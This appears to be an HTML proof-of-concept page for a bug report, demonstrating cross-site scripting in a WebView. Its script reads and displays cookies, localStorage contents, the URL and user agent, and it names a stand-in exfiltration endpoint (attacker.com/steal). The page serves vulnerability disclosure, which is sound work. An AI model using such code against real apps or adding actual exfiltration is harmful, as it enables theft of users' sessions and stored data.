<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS PoC</title>
    <style>
        body {
            font-family: monospace;
            background: #000;
            color: #0f0;
            padding: 20px;
        }
        .proof {
            background: #1a1a1a;
            border: 2px solid #f00;
            padding: 20px;
            margin: 10px 0;
        }
        h1 { color: #f00; }
        pre { color: #0ff; }
    </style>
</head>
<body>
    <h1>‚ö†Ô∏è XSS VULNERABILITY PROOF</h1>
    <div id="results"></div>
    
    <script>
        const results = document.getElementById('results');
        
        // IMMEDIATE XSS EXECUTION
        let output = '';
        
        // Test 1: Cookie Access
        output += '<div class="proof">';
        output += '<h2>‚úì COOKIES ACCESSED</h2>';
        if (document.cookie) {
            output += '<pre>' + document.cookie + '</pre>';
        } else {
            output += '<pre>No cookies (or httpOnly) - but JavaScript CAN execute!</pre>';
        }
        output += '</div>';
        
        // Test 2: localStorage
        output += '<div class="proof">';
        output += '<h2>‚úì LOCALSTORAGE ACCESSED</h2>';
        try {
            const storage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storage[key] = localStorage.getItem(key);
            }
            if (Object.keys(storage).length > 0) {
                output += '<pre>' + JSON.stringify(storage, null, 2).substring(0, 500) + '...</pre>';
            } else {
                output += '<pre>localStorage is empty - but JavaScript CAN access it!</pre>';
            }
        } catch(e) {
            output += '<pre>localStorage blocked: ' + e.message + '</pre>';
        }
        output += '</div>';
        
        // Test 3: DOM Access
        output += '<div class="proof">';
        output += '<h2>‚úì DOM ACCESSIBLE</h2>';
        output += '<pre>URL: ' + window.location.href + '</pre>';
        output += '<pre>User-Agent: ' + navigator.userAgent + '</pre>';
        output += '</div>';
        
        // Test 4: Network Request Capability
        output += '<div class="proof">';
        output += '<h2>‚úì CAN EXFILTRATE DATA</h2>';
        output += '<pre>fetch() available: ' + (typeof fetch !== 'undefined') + '</pre>';
        output += '<pre>XMLHttpRequest available: ' + (typeof XMLHttpRequest !== 'undefined') + '</pre>';
        output += '<pre>Attacker could send data to: https://attacker.com/steal</pre>';
        output += '</div>';
        
        // Test 5: Proof Summary
        output += '<div class="proof">';
        output += '<h2 style="color:#f00;">üö® XSS CONFIRMED</h2>';
        output += '<pre>JavaScript executed AUTOMATICALLY</pre>';
        output += '<pre>Full DOM access granted</pre>';
        output += '<pre>Can steal: cookies, storage, session data</pre>';
        output += '<pre>Can exfiltrate to attacker server</pre>';
        output += '<pre>NOT self-XSS - victim only clicked a link!</pre>';
        output += '</div>';
        
        results.innerHTML = output;
        
        // Log to console too
        console.log('=== XSS VULNERABILITY CONFIRMED ===');
        console.log('Cookies:', document.cookie);
        console.log('This proves JavaScript executes in WebView');
        console.log('Attacker can steal data and exfiltrate it');
    </script>
</body>
</html>
